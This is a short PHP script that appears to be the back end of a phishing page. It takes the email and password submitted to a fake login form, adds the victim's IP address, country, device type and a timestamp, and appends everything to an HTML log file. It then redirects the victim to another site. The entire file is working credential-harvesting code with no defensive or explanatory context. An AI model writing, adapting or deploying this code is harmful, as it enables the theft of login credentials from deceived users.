<?php

date_default_timezone_set('America/Bogota');

$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$device = $_SERVER['HTTP_USER_AGENT'];
$dateAndTime = date('d-m-Y h:i a', time());

include("geoiploc.php"); // Must include this

function getDeviceType($userAgent) {
    if (preg_match('/android/i', $userAgent)) {
        return 'Android';
    } elseif (preg_match('/ipad/i', $userAgent)) {
        return 'iPad';
    } elseif (preg_match('/iphone/i', $userAgent)) {
        return 'iPhone';
    } elseif (preg_match('/windows/i', $userAgent)) {
        return 'Windows';
    } else {
        return 'Desconocido';
    }
}

$f = fopen("hussszer.html", "a");
$deviceType = getDeviceType($device);
fwrite($f, '<center> Email: [<b><font color="white">'.$email.'</font></b>] Password: [<b><font color="yellow">'.$pass.'</font></b>] Fecha: [<b><font color="#70AFF9">'.$dateAndTime.'</font></b>] IP: [<b><font color="white">'.$ip.'</font></b>] País: [<b><font color="white">'.getCountryFromIP($ip, " NamE ").'</font></b>] Dispositivo: [<b><font color="white">'.$deviceType.'</font></b>] <br> </center>');
fclose($f);

header("Location: mipagina.com");
?>
